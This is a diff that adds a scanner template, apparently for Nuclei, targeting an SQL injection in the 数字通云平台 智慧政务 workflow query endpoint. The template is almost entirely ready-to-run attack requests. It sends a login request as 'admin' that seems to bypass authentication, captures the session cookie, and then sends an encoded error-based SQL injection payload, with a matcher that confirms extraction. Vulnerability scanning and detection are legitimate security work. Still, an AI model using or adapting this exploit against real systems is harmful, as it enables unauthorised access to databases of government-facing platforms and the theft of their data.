@@ -1,0 +1,46 @@
+id: sztOA-index-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 数字通云平台 智慧政务 /workflow/query/index 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%95%B0%E5%AD%97%E9%80%9AOA/%E6%95%B0%E5%AD%97%E9%80%9A%E4%BA%91%E5%B9%B3%E5%8F%B0%E6%99%BA%E6%85%A7%E6%94%BF%E5%8A%A1workflow%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /portal/default/login HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Priority: u=0, i
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        Content-Length: 22
+
+        userID=admin&flag=rone
+      - |+
+        GET /workflow/query/index?WfRtApplication%5Bselect_user%5D=1%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71786b7a71%2C%28SELECT%20%28ELT%285761=5761%2C1%29%29%29%2C0x7162717871%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29 HTTP/1.1
+        Host: {{Hostname}}
+        accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Cookie: {{GOASESSID}}
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qxkzq'
+    extractors:
+      - type: regex
+        name: GOASESSID
+        internal: true
+        part: header
+        regex:
+          - 'GOASESSID=([a-zA-Z0-9]+)'
